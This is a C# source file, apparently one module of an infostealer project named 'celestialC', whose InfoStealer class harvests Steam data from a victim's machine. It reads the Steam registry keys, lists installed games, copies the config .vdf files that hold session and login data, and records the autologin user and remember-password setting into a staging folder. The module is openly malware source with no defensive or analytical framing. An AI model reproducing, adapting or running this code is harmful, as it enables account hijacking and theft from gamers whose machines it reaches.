using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace celestialC.Stealer.Gaming.Steam
{
    internal static class InfoStealer
    {
        internal static async Task<int> StealSessions(string dst)
        {
            var rkSteam = Registry.CurrentUser.OpenSubKey("Software\\Valve\\Steam");
            if (rkSteam == null)
                return 0;

            var sSteamPath = rkSteam.GetValue("SteamPath").ToString();
            if (!Directory.Exists(sSteamPath))
                return 0;

            Directory.CreateDirectory(dst);

            var rkApps = rkSteam.OpenSubKey("Apps");

            try
            {
                if (rkApps == null)
                    return 0;

                // Get steam applications list
                foreach (var gameId in rkApps.GetSubKeyNames())
                    using (var app = rkSteam.OpenSubKey("Apps\\" + gameId))
                    {
                        if (app == null) continue;
                        var name = (string)app.GetValue("Name");
                        name = string.IsNullOrEmpty(name) ? "Unknown" : name;
                        var installed = (int)app.GetValue("Installed") == 1 ? "Yes" : "No";
                        var running = (int)app.GetValue("Running") == 1 ? "Yes" : "No";
                        var updating = (int)app.GetValue("Updating") == 1 ? "Yes" : "No";

                        File.AppendAllText(dst + "\\Apps.txt",
                            $"Application {name}\n\tGameID: {gameId}\n\tInstalled: {installed}\n\tRunning: {running}\n\tUpdating: {updating}\n\n");
                    }
            }
            catch (Exception ex)
            {

            }

            try
            {
                // Copy .vdf files
                var configPath = Path.Combine(sSteamPath, "config");
                if (Directory.Exists(configPath))
                {
                    Directory.CreateDirectory(dst + "\\configs");
                    foreach (var file in Directory.GetFiles(configPath))
                        if (file.EndsWith("vdf"))
                            File.Copy(file, dst + "\\configs\\" + Path.GetFileName(file));
                }
            }
            catch (Exception ex)
            {

            }

            try
            {
                var rememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                var sSteamInfo = string.Format(
                    "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
                    "\nRemember password: " + rememberPassword
                );
                File.WriteAllText(dst + "\\SteamInfo.txt", sSteamInfo);
            }
            catch (Exception ex)
            {

            }

            return 1;
        }
    }
}
